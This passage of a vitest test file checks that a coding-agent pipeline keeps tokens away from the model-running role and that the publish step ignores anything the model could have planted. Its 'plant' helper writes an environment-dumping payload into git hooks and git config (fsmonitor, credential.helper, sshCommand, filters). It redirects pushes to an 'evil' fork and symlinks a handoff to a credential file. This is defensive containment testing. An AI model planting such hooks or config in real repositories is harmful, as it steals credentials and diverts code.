import { execFileSync, spawn } from 'node:child_process';
import { appendFileSync, chmodSync, existsSync, mkdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { APP_ROOT, parseEnv, roleEnv, roleViolation } from '../src/config.js';
import { CoderHandoffZ, HandoffError, PrepareHandoffZ, copyUntrusted, readCoderHandoff, readPrepareHandoff, readUntrusted } from '../src/handoff.js';
import { prints, publishDeadline } from '../src/main.js';
import { publishGitEnv } from '../src/publish.js';
import { validate } from '../src/schemas.js';
import { feedRefusal } from '../src/verify.js';
import {
  ATTEMPT,
  BRANCH,
  ENDPOINT_TOKEN,
  INVESTIGATE_ATTEMPT,
  type World,
  filesContaining,
  ghLog,
  git,
  implementRequest,
  investigateRequest,
  makeSourceRepo,
  makeWorld,
  planRequest,
  remoteBranches,
  runRequest,
  runRole,
  script,
  sealDir,
} from './helpers.js';
import { type McpStub, startMcpStub } from './mcp-stub.js';

// Backlog #116: a Job is three containers. Each test here runs the roles as a Job would - one
// main() per role, each with only the credentials its container is handed, sharing nothing but
// files - and then looks at what the others could see.

const GH = 'fake-github-token-0123456789abcdef';
const NUGET = 'fake-nuget-token-fedcba9876543210';
const TOKENS = { GITHUB_TOKEN: GH, NUGET_GITHUB_TOKEN: NUGET };

let stderr: string[];

beforeEach(() => {
  stderr = [];
  vi.spyOn(process.stderr, 'write').mockImplementation(((chunk: string | Uint8Array) => {
    stderr.push(String(chunk));
    return true;
  }) as typeof process.stderr.write);
});

afterEach(() => {
  vi.restoreAllMocks();
});

const okImplement = (extra: unknown[] = []) => ({
  steps: [
    ...extra,
    { patch: '--- a/src/app.sh\n+++ b/src/app.sh\n@@ -1,3 +1,4 @@\n greet() {\n+  # deterministic\n   echo hello\n }\n' },
    { commit: 'fix(svc): greet is deterministic' },
    { result: { cost_usd: 1.25, structured_output: { files: ['src/app.sh'], deviations: [], summary: 'Made greet deterministic.' } } },
  ],
});

const handoff = (w: World, file: string) => join(w.work, 'handoff', file);
const readJson = (p: string) => JSON.parse(readFileSync(p, 'utf8')) as Record<string, unknown>;
const repoDir = (w: World) => join(w.work, 'repos', 'svc');

/** prepare and coder of an implement run, with the default good script. */
async function upToPublish(w: World, impl: unknown = okImplement()): Promise<void> {
  script(w, 'svc.implement.json', impl);
  const req = implementRequest(w);
  expect((await runRole(w, 'prepare', req, TOKENS)).doc).toBeNull();
  expect((await runRole(w, 'coder', req)).doc).toBeNull();
}

// =============================================================================================

describe('three roles, three environments', () => {
  it('implement: prepare and coder print nothing, publish prints the one result, and the PR is open', async () => {
    const w = makeWorld();
    script(w, 'svc.implement.json', okImplement());
    const req = implementRequest(w);

    const prepare = await runRole(w, 'prepare', req, TOKENS);
    expect(prepare).toMatchObject({ stdout: '', doc: null, exitCode: 0 });
    const sealed = readPrepareHandoff(sealDir(w))!;
    expect(sealed).toMatchObject({ role: 'prepare', phase: 'implement', attempt_id: ATTEMPT, terminal: null, base_commit: w.mainSha, repo_dir: 'svc' });
    expect(sealed.protected_globs).toContain('.github/**');
    expect(sealed.pr).toMatchObject({ assignee: 'Flou21', labels: ['hephaisto'] });
    expect(readPrepareHandoff(join(w.work, 'handoff'))).toEqual(sealed);

    const coder = await runRole(w, 'coder', req);
    expect(coder).toMatchObject({ stdout: '', doc: null, exitCode: 0 });
    const ch = readCoderHandoff(join(w.work, 'handoff'))!;
    expect(ch.publish).toBe(true);
    expect(ch.head).toBe(git(repoDir(w), 'rev-parse', 'HEAD'));
    expect(ch.report).toMatchObject({ buildPassed: true, testsPassed: true, failed: null, level: 'tests' });
    expect(remoteBranches(w)).not.toContain(BRANCH); // nothing has been pushed by the role that ran the model

    const publish = await runRole(w, 'publish', req, { GITHUB_TOKEN: GH });
    expect(publish.exitCode).toBe(0);
    const doc = publish.doc!;
    expect(validate('implement', doc).errors).toEqual([]);
    expect(doc).toMatchObject({ outcome: 'pr_opened', pr_number: 1, branch: BRANCH, base_commit: w.mainSha, files: ['src/app.sh'], build_passed: true, tests_passed: true, cost_usd: 1.25, error: null });
    expect(git(w.remote, 'rev-parse', BRANCH)).toBe(ch.head);
    expect(git(w.remote, 'rev-parse', 'main')).toBe(w.mainSha);
    expect(ghLog(w)).toMatch(/gh pr create .*--draft --base main --head hephaisto\/codefix-0192a6f00000 .*--assignee Flou21 --label hephaisto/);
    const body = readFileSync(join(w.ghState, 'prs', '1.body.md'), 'utf8');
    expect(body).toMatch(/\| test \| `sh test.sh` \| 0 \|/);
    expect(body).toContain('`main` moved 1 commit since the analysed commit.'); // a note prepare sealed
  });

  it('writes no token to the shared volume, the sealed volume, a log line or the result', async () => {
    const w = makeWorld();
    script(w, 'svc.implement.json', okImplement());
    const req = implementRequest(w);
    await runRole(w, 'prepare', req, TOKENS);
    await runRole(w, 'coder', req);
    const publish = await runRole(w, 'publish', req, { GITHUB_TOKEN: GH });
    expect(publish.doc!.outcome).toBe('pr_opened');
    for (const token of [GH, NUGET]) {
      expect(filesContaining(w.work, token)).toEqual([]);
      expect(filesContaining(sealDir(w), token)).toEqual([]);
      expect(filesContaining(w.ghState, token)).toEqual([]);
      expect(stderr.join('')).not.toContain(token);
      expect(publish.stdout).not.toContain(token);
    }
    // the remote the clone remembers is the request's URL, with nothing in it
    expect(git(repoDir(w), 'config', '--get', 'remote.origin.url')).toBe(w.remoteUrl);
  });

  it('plan: prepare clones with the token and prints nothing; coder, without one, prints the plan', async () => {
    const w = makeWorld();
    const req = planRequest(w);
    const prepare = await runRole(w, 'prepare', req, { ...TOKENS, CODEFIX_FAKE_SCRIPT_DIR: join(APP_ROOT, 'fake-scripts') });
    expect(prepare).toMatchObject({ stdout: '', doc: null, exitCode: 0 });
    expect(existsSync(join(sealDir(w), 'prepare.json'))).toBe(false); // nothing to seal: there is no publish role
    const coder = await runRole(w, 'coder', req, { CODEFIX_FAKE_SCRIPT_DIR: join(APP_ROOT, 'fake-scripts') });
    expect(coder.doc).toMatchObject({ phase: 'plan', outcome: 'planned', files: ['src/app.sh'], analysed_ref: w.mainSha, context_sha: git(w.context, 'rev-parse', 'HEAD') });
    expect(validate('plan', coder.doc).errors).toEqual([]);
  });

  it('a failure in prepare is printed by coder as an ordinary result, and the agent never starts', async () => {
    const w = makeWorld({ repoEntry: { coderEnabled: false } });
    script(w, 'default.plan.json', { steps: [{ throw: 'THE AGENT MUST NOT RUN' }] });
    const req = planRequest(w);
    const prepare = await runRole(w, 'prepare', req, TOKENS);
    expect(prepare).toMatchObject({ stdout: '', exitCode: 0 });
    expect(readPrepareHandoff(join(w.work, 'handoff'))!.terminal).toMatchObject({ outcome: 'failed', error: 'repository not enabled in dev-context repos.yaml' });
    const coder = await runRole(w, 'coder', req);
    expect(coder.doc).toMatchObject({ phase: 'plan', attempt_id: ATTEMPT, outcome: 'failed', error: 'repository not enabled in dev-context repos.yaml' });
    expect(coder.doc!.context_sha).toBe(git(w.context, 'rev-parse', 'HEAD'));
  });

  it('a request prepare cannot even validate still ends as a framed failure from coder', async () => {
    const w = makeWorld();
    const req = planRequest(w) as unknown as Record<string, unknown>;
    delete req.budget;
    expect(await runRole(w, 'prepare', req, TOKENS)).toMatchObject({ stdout: '', exitCode: 0 });
    const coder = await runRole(w, 'coder', req);
    expect(coder.doc).toMatchObject({ attempt_id: ATTEMPT, outcome: 'failed' });
    expect(coder.doc!.error).toMatch(/does not match the contract/);
  });

  it('implement: an open PR found by prepare is already_exists from publish, and coder does nothing', async () => {
    const w = makeWorld();
    const body = join(w.root, 'b.md');
    writeFileSync(body, 'earlier');
    execFileSync(join(APP_ROOT, 'test', 'gh-shim', 'gh'), ['pr', 'create', '--repo', w.remoteUrl.replace(/\.git$/, ''), '--draft', '--base', 'main', '--head', BRANCH, '--title', 'earlier', '--body-file', body], {
      env: { ...process.env, GH_SHIM_STATE: w.ghState, GH_SHIM_LOG: w.ghLog },
    });
    script(w, 'default.implement.json', { steps: [{ throw: 'THE AGENT MUST NOT RUN' }] });
    const req = implementRequest(w);
    await runRole(w, 'prepare', req, TOKENS);
    const coder = await runRole(w, 'coder', req);
    expect(coder).toMatchObject({ stdout: '', doc: null, exitCode: 0 });
    expect(existsSync(handoff(w, 'coder.json'))).toBe(false);
    const publish = await runRole(w, 'publish', req, { GITHUB_TOKEN: GH });
    expect(publish.doc).toMatchObject({ outcome: 'already_exists', pr_number: 1, pr_url: `${w.remoteUrl.replace(/\.git$/, '')}/pull/1`, error: null });
    expect(ghLog(w).match(/pr create/g)).toHaveLength(1);
  });

  it('implement: a red test is tests_failed from publish, with nothing pushed', async () => {
    const w = makeWorld();
    await upToPublish(w, {
      steps: [
        { patch: '--- a/src/app.sh\n+++ b/src/app.sh\n@@ -1,3 +1,3 @@\n greet() {\n-  echo hello\n+  echo hullo\n }\n' },
        { commit: 'fix(svc): break it' },
        { result: { cost_usd: 1, structured_output: { files: ['src/app.sh'], deviations: [] } } },
      ],
    });
    expect(existsSync(handoff(w, 'branch.bundle'))).toBe(false);
    const publish = await runRole(w, 'publish', implementRequest(w), { GITHUB_TOKEN: GH });
    expect(publish.doc).toMatchObject({ outcome: 'tests_failed', build_passed: true, tests_passed: false, pr_url: null, cost_usd: 1 });
    expect(publish.doc!.log_tail).toMatch(/FAIL: greet returned hullo/);
    expect(remoteBranches(w)).not.toContain(BRANCH);
    expect(ghLog(w)).not.toMatch(/pr create/);
  });
});

// =============================================================================================

describe('a role beside a credential that is not its own refuses to start', () => {
  it('coder beside GITHUB_TOKEN: the plan fails without the agent running', async () => {
    const w = makeWorld();
    script(w, 'default.plan.json', { steps: [{ throw: 'THE AGENT MUST NOT RUN' }] });
    const req = planRequest(w);
    await runRole(w, 'prepare', req, TOKENS);
    const coder = await runRole(w, 'coder', req, { GITHUB_TOKEN: GH });
    expect(coder.doc!.outcome).toBe('failed');
    expect(coder.doc!.error).toMatch(/coder role .* refuses to start while GITHUB_TOKEN is set/);
    expect(coder.stdout).not.toContain(GH);
  });

  it.each(['NUGET_GITHUB_TOKEN', 'GH_TOKEN', 'CODEFIX_GIT_PASSWORD'])('coder beside %s, in implement: publish prints the refusal', async (name) => {
    const w = makeWorld();
    script(w, 'default.implement.json', { steps: [{ throw: 'THE AGENT MUST NOT RUN' }] });
    const req = implementRequest(w);
    await runRole(w, 'prepare', req, TOKENS);
    const coder = await runRole(w, 'coder', req, { [name]: NUGET });
    expect(coder).toMatchObject({ stdout: '', exitCode: 0 });
    expect(readCoderHandoff(join(w.work, 'handoff'))).toMatchObject({ publish: false });
    const publish = await runRole(w, 'publish', req, { GITHUB_TOKEN: GH });
    expect(publish.doc!.outcome).toBe('failed');
    expect(publish.doc!.error).toMatch(new RegExp(`refuses to start while ${name} is set`));
    expect(remoteBranches(w)).not.toContain(BRANCH);
  });

  it('prepare and publish beside a model credential, in a real-SDK Job', () => {
    const base = { CODEFIX_SDK: 'real', CLAUDE_CODE_OAUTH_TOKEN: 'sk-ant-oat01-not-a-real-token', GITHUB_TOKEN: GH };
    expect(roleViolation(parseEnv({ ...base, CODEFIX_ROLE: 'prepare' }))).toMatch(/prepare role .* refuses to start while CLAUDE_CODE_OAUTH_TOKEN is set/);
    expect(roleViolation(parseEnv({ ...base, CODEFIX_ROLE: 'publish' }))).toMatch(/publish role/);
    expect(roleViolation(parseEnv({ CODEFIX_ROLE: 'coder', CLAUDE_CODE_OAUTH_TOKEN: 'x' }))).toBeNull();
    expect(roleViolation(parseEnv({ CODEFIX_ROLE: 'prepare', ...TOKENS }))).toBeNull();
    expect(roleViolation(parseEnv({ CODEFIX_ROLE: 'publish', GITHUB_TOKEN: GH }))).toBeNull();
    // one process for everything separates nothing, and says so in a warning rather than a refusal
    expect(roleViolation(parseEnv({ ...base }))).toBeNull();
  });

  it('publish is implement only', async () => {
    const w = makeWorld();
    const publish = await runRole(w, 'publish', planRequest(w), { GITHUB_TOKEN: GH });
    expect(publish.doc!.error).toMatch(/publish role exists only for the implement phase/);
  });

  it('coder without a prepare handoff fails with a result, not a crash', async () => {
    const w = makeWorld();
    const coder = await runRole(w, 'coder', planRequest(w));
    expect(coder.doc!.outcome).toBe('failed');
    expect(coder.doc!.error).toMatch(/prepare role left no handoff/);
  });

  it('roleEnv gives each role of a one-process run what its container would hold', () => {
    const all = parseEnv({ PATH: '/bin', CODEFIX_SDK: 'real', ANTHROPIC_API_KEY: 'k', GH_TOKEN: 'g', ...TOKENS });
    const coder = roleEnv(all, 'coder');
    expect(coder).toMatchObject({ role: 'coder', githubToken: undefined, nugetToken: undefined, anthropicAuth: { name: 'ANTHROPIC_API_KEY' } });
    expect(Object.keys(coder.base).sort()).toEqual(['ANTHROPIC_API_KEY', 'CODEFIX_SDK', 'PATH']);
    const prepare = roleEnv(all, 'prepare');
    expect(prepare).toMatchObject({ githubToken: GH, nugetToken: NUGET, anthropicAuth: undefined });
    expect(prepare.base.ANTHROPIC_API_KEY).toBeUndefined();
    const publish = roleEnv(all, 'publish');
    expect(publish).toMatchObject({ githubToken: GH, nugetToken: undefined, anthropicAuth: undefined });
    expect(publish.base.NUGET_GITHUB_TOKEN).toBeUndefined();
  });

  it('only the container Hephaisto reads prints', () => {
    expect((['plan', 'implement', 'investigate'] as const).map((p) => prints('prepare', p))).toEqual([false, false, false]);
    expect((['plan', 'implement', 'investigate'] as const).map((p) => prints('coder', p))).toEqual([true, false, true]);
    expect(prints('publish', 'implement')).toBe(true);
    expect(prints('all', 'implement')).toBe(true);
  });

  it('publish works in the headroom the coder role leaves, counted from when prepare started', () => {
    expect(publishDeadline(3600, 0, 0)).toBe(3585_000);
    expect(publishDeadline(3600, 0, 3600_000)).toBe(3630_000); // already late: half a minute to say so
  });
});

// =============================================================================================

/**
 * Everything a repository can carry that makes git run a command or talk to another host,
 * planted where the model could have planted it: the shared repository, the shared HOME.
 * `payload` records that it ran and dumps its environment.
 */
function plant(w: World): { marker: string; evil: string } {
  const repo = repoDir(w);
  const marker = join(w.root, 'pwned');
  // somebody else's copy of the repository: a fork, on a host the configuration redirects to
  const evil = join(w.root, 'evil.git');
  git(w.root, 'clone', '-q', '--bare', w.remote, evil);
  git(evil, 'config', 'uploadpack.allowFilter', 'true');
  git(evil, 'config', 'uploadpack.allowAnySHA1InWant', 'true');
  const payload = join(w.work, 'payload.sh');
  writeFileSync(payload, `#!/bin/sh\n{ echo "ran: $0 $*"; env; } >> '${marker}'\nexit 0\n`);
  chmodSync(payload, 0o755);
  const hooks = ['pre-push', 'reference-transaction', 'pre-receive', 'update', 'post-update', 'post-checkout', 'post-merge', 'pre-commit', 'post-index-change', 'pre-auto-gc', 'push-to-checkout'];
  for (const dir of [join(repo, '.git', 'hooks'), join(w.work, 'evil-hooks')]) {
    mkdirSync(dir, { recursive: true });
    for (const h of hooks) {
      writeFileSync(join(dir, h), readFileSync(payload));
      chmodSync(join(dir, h), 0o755);
    }
  }
  const config = `
[core]
	fsmonitor = ${payload}
	hooksPath = ${join(w.work, 'evil-hooks')}
	sshCommand = ${payload}
	askPass = ${payload}
	pager = ${payload}
[credential]
	helper = "!${payload}"
[url "file://${evil}"]
	insteadOf = ${w.remoteUrl}
	pushInsteadOf = ${w.remoteUrl}
[push]
	gpgSign = if-asked
[gpg]
	program = ${payload}
[filter "x"]
	clean = ${payload}
	smudge = ${payload}
[diff "x"]
	textconv = ${payload}
	command = ${payload}
`;
  writeFileSync(join(w.work, 'evil.gitconfig'), config);
  appendFileSync(join(repo, '.git', 'config'), `${config}[remote "origin"]\n\tpushurl = file://${evil}\n[include]\n\tpath = ${join(w.work, 'evil.gitconfig')}\n`);
  mkdirSync(join(repo, '.git', 'info'), { recursive: true });
  writeFileSync(join(repo, '.git', 'info', 'attributes'), '* filter=x diff=x\n');
  // the shared HOME, which the driver's git and gh used before #116
  mkdirSync(join(w.work, 'home', '.config', 'git'), { recursive: true });
  writeFileSync(join(w.work, 'home', '.gitconfig'), config);
  writeFileSync(join(w.work, 'home', '.config', 'git', 'config'), config);
  writeFileSync(join(w.work, 'home', '.config', 'git', 'attributes'), '* filter=x diff=x\n');
  return { marker, evil };
}

describe('publish trusts nothing the model could have written', () => {
  it('a planted hook and a planted .git/config are live for the old way of pushing, and dead for publish', async () => {
    const w = makeWorld();
    await upToPublish(w);
    const { marker, evil } = plant(w);
    const head = git(repoDir(w), 'rev-parse', 'HEAD');

    // THE CONTROL: what the driver did before #116 - `git push origin` in the shared repository,
    // with the token in the environment. The planted configuration runs, sees the token, and
    // sends the branch to another repository.
    const old = { PATH: process.env.PATH, HOME: join(w.work, 'home'), GIT_TERMINAL_PROMPT: '0', CODEFIX_GIT_PASSWORD: GH };
    execFileSync('git', ['status', '--porcelain'], { cwd: repoDir(w), env: old, stdio: 'pipe' });
    execFileSync('git', ['push', '--no-verify', 'origin', `refs/heads/${BRANCH}:refs/heads/${BRANCH}`], { cwd: repoDir(w), env: old, stdio: 'pipe' });
    const dumped = readFileSync(marker, 'utf8');
    expect(dumped).toMatch(/^ran: .*fsmonitor|^ran: .*payload\.sh/m); // core.fsmonitor, on a mere `git status`
    expect(dumped).toMatch(/^ran: .*reference-transaction/m); // a hook --no-verify does not skip
    expect(dumped).toContain(`CODEFIX_GIT_PASSWORD=${GH}`);
    const evilBranches = () => git(evil, 'for-each-ref', '--format=%(refname:short)', 'refs/heads').split('\n');
    expect(evilBranches()).toContain(BRANCH); // and the branch went to the other repository
    expect(remoteBranches(w)).not.toContain(BRANCH);
    rmSync(marker);
    git(evil, 'update-ref', '-d', `refs/heads/${BRANCH}`);

    // publish, with the same plant in place
    const publish = await runRole(w, 'publish', implementRequest(w), { GITHUB_TOKEN: GH });
    expect(publish.doc).toMatchObject({ outcome: 'pr_opened', error: null });
    expect(existsSync(marker)).toBe(false); // nothing planted ran
    expect(evilBranches()).not.toContain(BRANCH); // and the push went nowhere else
    expect(git(w.remote, 'rev-parse', BRANCH)).toBe(head);
    expect(git(w.remote, 'rev-parse', 'main')).toBe(w.mainSha);
    for (const where of [w.work, sealDir(w), w.ghState]) expect(filesContaining(where, GH)).toEqual([]);
    expect(stderr.join('')).not.toContain(GH);
    expect(publish.stdout).not.toContain(GH);
  });

  it('never runs git with the shared volume as its repository, home or working directory', () => {
    const env = parseEnv({ PATH: '/bin', CODEFIX_ROLE: 'publish', CODEFIX_WORK_DIR: '/work', GITHUB_TOKEN: GH, HOME: '/work/home', GIT_DIR: '/work/repos/svc/.git', GIT_SSH_COMMAND: 'evil', XDG_CONFIG_HOME: '/work/home/.config' });
    const g = publishGitEnv(env, '/tmp/scratch');
    expect(g.HOME).toBe('/tmp/scratch/home');
    expect(g.XDG_CONFIG_HOME).toBe('/tmp/scratch/home/.config');
    expect(g.GIT_CEILING_DIRECTORIES).toBe('/tmp/scratch');
    expect(g).toMatchObject({ GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null', GIT_ATTR_NOSYSTEM: '1', GIT_NO_REPLACE_OBJECTS: '1', GIT_TERMINAL_PROMPT: '0' });
    expect(g.GIT_DIR).toBeUndefined();
    expect(g.GIT_SSH_COMMAND).toBeUndefined();
    expect(Object.values(g).filter((v) => typeof v === 'string' && v.startsWith('/work'))).toEqual([]);
    const cfg = new Map<string, string>();
    for (let i = 0; i < Number(g.GIT_CONFIG_COUNT); i++) cfg.set(g[`GIT_CONFIG_KEY_${i}`]!, g[`GIT_CONFIG_VALUE_${i}`]!);
    expect(cfg.get('core.hooksPath')).toBe('/dev/null');
    expect(cfg.get('core.fsmonitor')).toBe('false');
    expect(cfg.get('credential.helper')).toBe('');
    expect(cfg.get('push.recurseSubmodules')).toBe('no');
    expect(cfg.get('protocol.ext.allow')).toBe('never');
  });

  it('refuses to work in a scratch directory on the shared volume', async () => {
    const w = makeWorld();
    await upToPublish(w);
    mkdirSync(join(w.work, 'tmp'));
    const publish = await runRole(w, 'publish', implementRequest(w), { GITHUB_TOKEN: GH, TMPDIR: join(w.work, 'tmp') });
    expect(publish.doc!.outcome).toBe('failed');
    expect(publish.doc!.error).toMatch(/scratch directory of the publish role is on the shared volume; nothing was pushed/);
    expect(remoteBranches(w)).not.toContain(BRANCH);
  });

  it('checks the publishing policy on the commit it is about to push, whatever the handoff says', async () => {
    const w = makeWorld();
    await upToPublish(w);
    // after the driver verified: one more commit, a workflow, and a handoff edited to match
    const repo = repoDir(w);
    writeFileSync(join(repo, '.github', 'workflows', 'evil.yml'), 'on: push\n');
    git(repo, 'add', '-A');
    git(repo, 'commit', '-q', '-m', `ci: more\n\nHephaisto-Attempt: ${ATTEMPT}`);
    const tip = git(repo, 'rev-parse', 'HEAD');
    rmSync(handoff(w, 'branch.bundle'));
    git(repo, 'bundle', 'create', '-q', handoff(w, 'branch.bundle'), `${w.mainSha}..refs/heads/${BRANCH}`);
    const ch = readJson(handoff(w, 'coder.json'));
    writeFileSync(handoff(w, 'coder.json'), JSON.stringify({ ...ch, head: tip }));

    const publish = await runRole(w, 'publish', implementRequest(w), { GITHUB_TOKEN: GH });
    expect(publish.doc!.outcome).toBe('policy_diff');
    expect(publish.doc!.error).toMatch(/\.github\/workflows\/evil\.yml is a protected path/);
    expect(publish.doc!.files).toEqual(['.github/workflows/evil.yml', 'src/app.sh']);
    expect(remoteBranches(w)).not.toContain(BRANCH);
    expect(ghLog(w)).not.toMatch(/pr create/);
  });

  it('takes the protected paths from the sealed handoff, not from the dev-context the model could edit', async () => {
    const w = makeWorld({ protectedPaths: ['src/secret/**'] });
    await upToPublish(w, {
      steps: [
        { append: { path: 'src/app.sh', text: '# tidy\n' } },
        { commit: 'fix: tidy' },
        { result: { cost_usd: 0.1, structured_output: { files: ['src/app.sh'], deviations: [] } } },
      ],
    });
    // the model, afterwards: a new commit under the protected path, and repos.yaml without the rule
    const repo = repoDir(w);
    mkdirSync(join(repo, 'src', 'secret'));
    writeFileSync(join(repo, 'src', 'secret', 'x'), 'x\n');
    git(repo, 'add', '-A');
    git(repo, 'commit', '-q', '-m', `more\n\nHephaisto-Attempt: ${ATTEMPT}`);
    rmSync(handoff(w, 'branch.bundle'));
    git(repo, 'bundle', 'create', '-q', handoff(w, 'branch.bundle'), `${w.mainSha}..refs/heads/${BRANCH}`);
    writeFileSync(handoff(w, 'coder.json'), JSON.stringify({ ...readJson(handoff(w, 'coder.json')), head: git(repo, 'rev-parse', 'HEAD') }));
    const yaml = join(w.work, 'context', 'repos.yaml');
    writeFileSync(yaml, readFileSync(yaml, 'utf8').replace('src/secret/**', 'nothing/**'));
    const prep = readJson(handoff(w, 'prepare.json'));
    writeFileSync(handoff(w, 'prepare.json'), JSON.stringify({ ...prep, protected_globs: [] }));

    const publish = await runRole(w, 'publish', implementRequest(w), { GITHUB_TOKEN: GH });
    expect(publish.doc!.outcome).toBe('policy_diff');
    expect(publish.doc!.error).toMatch(/src\/secret\/x is a protected path/);
    expect(remoteBranches(w)).not.toContain(BRANCH);
  });

  it.each([
    ['a tip other than the one the driver verified', (w: World) => {
      const repo = repoDir(w);
      writeFileSync(join(repo, 'src', 'app.sh'), 'greet() {\n  echo hello # swapped after the tests\n}\n');
      git(repo, 'commit', '-q', '-am', `swap\n\nHephaisto-Attempt: ${ATTEMPT}`);
      rmSync(handoff(w, 'branch.bundle'));
      git(repo, 'bundle', 'create', '-q', handoff(w, 'branch.bundle'), `${w.mainSha}..refs/heads/${BRANCH}`);
    }, /bundle's tip [0-9a-f]{40} is not the commit the driver verified/],
    ['a commit without this attempt\'s trailer', (w: World) => {
      const repo = repoDir(w);
      writeFileSync(join(repo, 'src', 'app.sh'), 'greet() {\n  echo hello # someone else\n}\n');
      git(repo, 'commit', '-q', '-am', 'no trailer');
      rmSync(handoff(w, 'branch.bundle'));
      git(repo, 'bundle', 'create', '-q', handoff(w, 'branch.bundle'), `${w.mainSha}..refs/heads/${BRANCH}`);
      writeFileSync(handoff(w, 'coder.json'), JSON.stringify({ ...readJson(handoff(w, 'coder.json')), head: git(repo, 'rev-parse', 'HEAD') }));
    }, /1 commit\(s\) on the branch do not carry Hephaisto-Attempt/],
    ['a branch that does not descend from the prepared base', (w: World) => {
      const other = join(w.root, 'other');
      mkdirSync(other);
      git(other, 'init', '-q', '-b', BRANCH);
      writeFileSync(join(other, 'x'), 'x\n');
      git(other, 'add', '-A');
      git(other, 'commit', '-q', '-m', `unrelated\n\nHephaisto-Attempt: ${ATTEMPT}`);
      rmSync(handoff(w, 'branch.bundle'));
      git(other, 'bundle', 'create', '-q', handoff(w, 'branch.bundle'), `refs/heads/${BRANCH}`);
      writeFileSync(handoff(w, 'coder.json'), JSON.stringify({ ...readJson(handoff(w, 'coder.json')), head: git(other, 'rev-parse', 'HEAD') }));
    }, /does not descend from the base commit/],
    ['a bundle that is not a bundle', (w: World) => {
      writeFileSync(handoff(w, 'branch.bundle'), 'not a bundle\n');
    }, /could not be read from the coder's bundle/],
    ['a bundle that is a link to another file', (w: World) => {
      const elsewhere = join(w.root, 'elsewhere.bundle');
      writeFileSync(elsewhere, readFileSync(handoff(w, 'branch.bundle')));
      rmSync(handoff(w, 'branch.bundle'));
      symlinkSync(elsewhere, handoff(w, 'branch.bundle'));
    }, /bundle could not be read as a plain file \(ELOOP\)/],
    ['no bundle at all', (w: World) => {
      rmSync(handoff(w, 'branch.bundle'));
    }, /bundle could not be read as a plain file \(ENOENT\)/],
    ['a handoff that asks to publish a red verification', (w: World) => {
      const ch = readJson(handoff(w, 'coder.json')) as { report: { steps: unknown[] } };
      writeFileSync(handoff(w, 'coder.json'), JSON.stringify({ ...ch, report: { ...ch.report, failed: ch.report.steps[0] } }));
    }, /asks to publish without a green verification/],
    ['a handoff for another attempt', (w: World) => {
      writeFileSync(handoff(w, 'coder.json'), JSON.stringify({ ...readJson(handoff(w, 'coder.json')), attempt_id: INVESTIGATE_ATTEMPT }));
    }, /handoff is for another attempt/],
    ['a handoff with a field the schema does not know', (w: World) => {
      writeFileSync(handoff(w, 'coder.json'), JSON.stringify({ ...readJson(handoff(w, 'coder.json')), push_to: 'main' }));
    }, /handoff does not match its schema/],
    ['a handoff whose result is not an implement result', (w: World) => {
      writeFileSync(handoff(w, 'coder.json'), JSON.stringify({ ...readJson(handoff(w, 'coder.json')), result: { outcome: 'pr_opened', pr_url: 'https://evil/pull/1' } }));
    }, /result that does not match the contract/],
    ['no handoff', (w: World) => {
      rmSync(handoff(w, 'coder.json'));
    }, /coder role left no handoff/],
    ['a handoff directory that became a link', (w: World) => {
      const real = join(w.root, 'real-handoff');
      execFileSync('mv', [join(w.work, 'handoff'), real]);
      symlinkSync(real, join(w.work, 'handoff'));
    }, /coder role left no handoff/],
  ] as [string, (w: World) => void, RegExp][])('refuses %s, and pushes nothing', async (_name, tamper, why) => {
    const w = makeWorld();
    await upToPublish(w);
    tamper(w);
    const publish = await runRole(w, 'publish', implementRequest(w), { GITHUB_TOKEN: GH });
    expect(validate('implement', publish.doc).errors).toEqual([]);
    expect(publish.doc).toMatchObject({ outcome: 'failed', pr_url: null, pr_number: null, branch: BRANCH, base_commit: w.mainSha });
    expect(publish.doc!.error).toMatch(why);
    expect(publish.doc!.error).toMatch(/nothing was pushed$/);
    expect(remoteBranches(w)).not.toContain(BRANCH);
    expect(ghLog(w)).not.toMatch(/pr create/);
  });

  it('a handoff that is a link to a file holding a credential is refused without being read into anything', async () => {
    const w = makeWorld();
    await upToPublish(w);
    // what /proc/self/environ would be to the reader: a file full of its own secrets
    const environ = join(w.root, 'environ');
    writeFileSync(environ, `PATH=/bin\0GITHUB_TOKEN=${GH}\0`);
    rmSync(handoff(w, 'coder.json'));
    symlinkSync(environ, handoff(w, 'coder.json'));
    const publish = await runRole(w, 'publish', implementRequest(w), { GITHUB_TOKEN: GH });
    expect(publish.doc!.outcome).toBe('failed');
    expect(publish.doc!.error).toMatch(/handoff could not be read as a plain file \(ELOOP\); nothing was pushed/);
    expect(publish.stdout).not.toContain(GH);
    expect(stderr.join('')).not.toContain(GH);
  });

  it('a handoff that is not JSON is refused in one sentence that quotes none of it', async () => {
    const w = makeWorld();
    await upToPublish(w);
    writeFileSync(handoff(w, 'coder.json'), `GITHUB_TOKEN=${GH} and more`);
    const publish = await runRole(w, 'publish', implementRequest(w), { GITHUB_TOKEN: GH });
    expect(publish.doc!.error).toBe("the coder's handoff is not JSON; nothing was pushed");
    expect(stderr.join('')).not.toContain('and more');
  });

  it('the coder role cannot claim a pull request: pr_opened without a branch is a failure', async () => {
    const w = makeWorld();
    await upToPublish(w);
    const ch = readJson(handoff(w, 'coder.json')) as { result: Record<string, unknown> };
    writeFileSync(handoff(w, 'coder.json'), JSON.stringify({ ...ch, publish: false, head: null, report: null, result: { ...ch.result, outcome: 'pr_opened', pr_url: 'https://github.com/evil/evil/pull/1', pr_number: 1, error: null } }));
    const publish = await runRole(w, 'publish', implementRequest(w), { GITHUB_TOKEN: GH });
    expect(publish.doc).toMatchObject({ outcome: 'failed', pr_url: null, pr_number: null });
    expect(publish.doc!.error).toMatch(/reported pr_opened without handing over a branch/);
  });

  it('a pull request text that would carry the token is not sent', async () => {
    const w = makeWorld();
    await upToPublish(w);
    const ch = readJson(handoff(w, 'coder.json')) as { result: Record<string, unknown> };
    writeFileSync(handoff(w, 'coder.json'), JSON.stringify({ ...ch, result: { ...ch.result, deviations: [`the token is ${GH}`] } }));
    const publish = await runRole(w, 'publish', implementRequest(w), { GITHUB_TOKEN: GH });
    expect(publish.doc!.error).toMatch(/pull request text would contain a credential of this container; nothing was pushed/);
    expect(remoteBranches(w)).not.toContain(BRANCH);
  });

  it('asks the remote again before pushing: a branch someone else pushed meanwhile is not overwritten', async () => {
    const w = makeWorld();
    await upToPublish(w);
    const tmp = join(w.root, 'human');
